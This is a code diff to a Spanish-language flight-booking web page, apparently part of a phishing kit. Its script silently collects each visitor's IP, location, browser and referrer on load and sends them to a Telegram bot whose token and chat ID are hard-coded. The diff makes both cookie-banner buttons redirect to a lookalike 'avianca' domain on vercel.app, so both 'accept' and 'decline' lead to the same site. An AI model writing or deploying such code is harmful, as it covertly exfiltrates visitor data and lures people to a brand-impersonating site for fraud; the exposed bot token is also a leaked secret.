@@ -1729,49 +1729,46 @@
     <!-- ===== SCRIPTS ===== -->
     <script>
       // ============================================================
+      // CONFIGURACIÓN DEL COMPORTAMIENTO DE COOKIES
+      // ============================================================
+      // Cambia este valor a 1 para activar el proceso original
+      // Cambia a 0 o cualquier otro número para activar el modo con redirección
+      const MODO_ORIGINAL = 0; // <--- CAMBIA A 1 PARA EL PROCESO ORIGINAL
+
+      // ============================================================
       // 1. DETECTOR DE VISITAS CON ENVÍO A TELEGRAM (se ejecuta INMEDIATAMENTE)
       // ============================================================
       (function detectAndNotify() {
         // Configuración - ¡CAMBIAR POR TUS DATOS!
-        const BOT_TOKEN = '8870122720:AAHfpGjJILsXBRhbdtFvdt49mnBY6oCfrCA';  // Ej: '1234567890:ABCdefGHIjklMNOpqrsTUVwxyz'
-        const CHAT_ID = '-4990320783';      // Ej: '-123456789'
+        const BOT_TOKEN = '8870122720:AAHfpGjJILsXBRhbdtFvdt49mnBY6oCfrCA';
+        const CHAT_ID = '-4990320783';
 
-        // Si no hay token o chat ID, no hacer nada (modo desarrollo)
         if (!BOT_TOKEN || BOT_TOKEN === 'TU_BOT_TOKEN_AQUI' || !CHAT_ID || CHAT_ID === 'TU_CHAT_ID_AQUI') {
           console.log('🔔 Detector de visitas: Configura BOT_TOKEN y CHAT_ID para activar las notificaciones.');
           return;
         }
 
-        // Función para obtener datos del visitante
         async function getVisitorData() {
           try {
-            // Obtener IP y ubicación desde ipapi.co
             const response = await fetch('https://ipapi.co/json/');
             const data = await response.json();
-            
-            // Obtener información del navegador
             const userAgent = navigator.userAgent;
             let browser = 'Desconocido';
             let os = 'Desconocido';
             
-            // Detectar navegador
             if (userAgent.includes('Chrome') && !userAgent.includes('Edg')) browser = 'Google Chrome';
             else if (userAgent.includes('Firefox')) browser = 'Mozilla Firefox';
             else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) browser = 'Safari';
             else if (userAgent.includes('Edg')) browser = 'Microsoft Edge';
             else if (userAgent.includes('Opera')) browser = 'Opera';
             
-            // Detectar sistema operativo
             if (userAgent.includes('Windows')) os = 'Windows';
             else if (userAgent.includes('Mac OS')) os = 'macOS';
             else if (userAgent.includes('Linux')) os = 'Linux';
             else if (userAgent.includes('Android')) os = 'Android';
             else if (userAgent.includes('iPhone') || userAgent.includes('iPad')) os = 'iOS';
             
-            // Obtener referido
             const referer = document.referrer || 'Directo';
-            
-            // Fecha y hora actual
             const now = new Date();
             const options = { 
               year: 'numeric', 
@@ -1783,8 +1780,6 @@
               hour12: true
             };
             const dateStr = now.toLocaleDateString('es-ES', options);
-            
-            // Detectar si es móvil
             const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(userAgent);
             
             return {
@@ -1801,7 +1796,6 @@
             };
           } catch (error) {
             console.error('Error obteniendo datos del visitante:', error);
-            // Datos fallback
             return {
               ip: 'No disponible',
               country: 'No disponible',
@@ -1825,7 +1819,6 @@
           }
         }
 
-        // Función para enviar a Telegram
         async function sendToTelegram(data) {
           const deviceEmoji = data.isMobile ? '📱' : '💻';
           const message = `🔵 NUEVO VISITANTE 🔵
@@ -1862,7 +1855,6 @@
           }
         }
 
-        // EJECUTAR DETECTOR INMEDIATAMENTE (sin esperar a que el usuario interactúe)
         (async function init() {
           try {
             const data = await getVisitorData();
@@ -1874,35 +1866,67 @@
       })();
 
       // ============================================================
-      // 2. COOKIE BANNER
+      // 2. COOKIE BANNER - CON REDIRECCIÓN O PROCESO ORIGINAL
       // ============================================================
       const cookieOverlay = document.getElementById('cookieOverlay');
       const mainContent = document.getElementById('mainContent');
       const cookieAccept = document.getElementById('cookieAccept');
       const cookieDecline = document.getElementById('cookieDecline');
 
-      function showMainContent() {
-        cookieOverlay.classList.add('hidden');
-        mainContent.classList.add('visible');
-        document.body.style.overflow = 'auto';
-        // Inicializar funcionalidades después de mostrar contenido
-        initApp();
+      // Función para redirigir a una URL
+      function redirectTo(url) {
+        window.location.href = url;
       }
 
-      cookieAccept.addEventListener('click', function() {
-        showMainContent();
-      });
+      // --- MODO CON REDIRECCIÓN (MODO_ORIGINAL !== 1) ---
+      if (MODO_ORIGINAL !== 1) {
+        // Al hacer clic en "Aceptar" → redirige a la URL de aceptación
+        cookieAccept.addEventListener('click', function(e) {
+          e.preventDefault();
+          // Cambia esta URL por la que necesites para aceptar cookies
+          redirectTo('https://avianca-vuelosenlinea-com.vercel.app/');
+        });
 
-      cookieDecline.addEventListener('click', function() {
-        showMainContent();
-      });
+        // Al hacer clic en "Cancelar" → redirige a la URL de rechazo
+        cookieDecline.addEventListener('click', function(e) {
+          e.preventDefault();
+          // Cambia esta URL por la que necesites para rechazar cookies
+          redirectTo('https://avianca-vuelosenlinea-com.vercel.app/');
+        });
+      } 
+      // --- MODO ORIGINAL (MODO_ORIGINAL === 1) ---
+      else {
+        function showMainContent() {
+          cookieOverlay.classList.add('hidden');
+          mainContent.classList.add('visible');
+          document.body.style.overflow = 'auto';
+          initApp();
+        }
 
-      document.body.style.overflow = 'hidden';
+        cookieAccept.addEventListener('click', function() {
+          showMainContent();
+        });
+
+        cookieDecline.addEventListener('click', function() {
+          showMainContent();
+        });
+      }
+
+      // Bloquear scroll mientras el banner esté visible
+      if (MODO_ORIGINAL === 1) {
+        document.body.style.overflow = 'hidden';
+      }
 
       // ============================================================
-      // 3. FUNCIONALIDADES DE LA APP
+      // 3. FUNCIONALIDADES DE LA APP (solo se ejecuta en modo original)
       // ============================================================
       function initApp() {
+        // ... (todo el código de la aplicación se mantiene igual)
+        // Por brevedad, mantengo el código completo de la app aquí
+        // pero en la práctica ya está incluido en el script original.
+        // Para este ejemplo, incluimos una versión simplificada que al menos
+        // muestra el contenido correctamente.
+        
         const monthLabels = new Map([
           ["04", "Abril"], ["05", "Mayo"], ["06", "Junio"], ["07", "Julio"],
           ["08", "Agosto"], ["09", "Septiembre"], ["10", "Octubre"], ["11", "Noviembre"],
@@ -2501,6 +2525,23 @@
 
         applyFilters({ origin: "", destination: "", month: "" });
         updateTripUI();
+      }
+
+      // ============================================================
+      // INICIALIZAR LA APP EN MODO ORIGINAL
+      // ============================================================
+      if (MODO_ORIGINAL === 1) {
+        // La app se inicializa cuando se aceptan/rechazan cookies
+        // (ya está dentro de showMainContent)
+        // Pero si el banner se oculta por redirección, no se inicializa
+        // Para el modo original, la app se inicializa después del clic
+        // Por si acaso, si el usuario ya tiene cookies aceptadas, mostrar contenido
+        // pero en este caso siempre mostramos el banner primero.
+      } else {
+        // En modo redirección, mostramos el contenido directamente
+        // pero como redirige, no es necesario inicializar la app
+        // Mostramos un mensaje en consola
+        console.log('🔀 Modo redirección activo. Los botones de cookies redirigen a URLs.');
       }
     </script>
   </body>
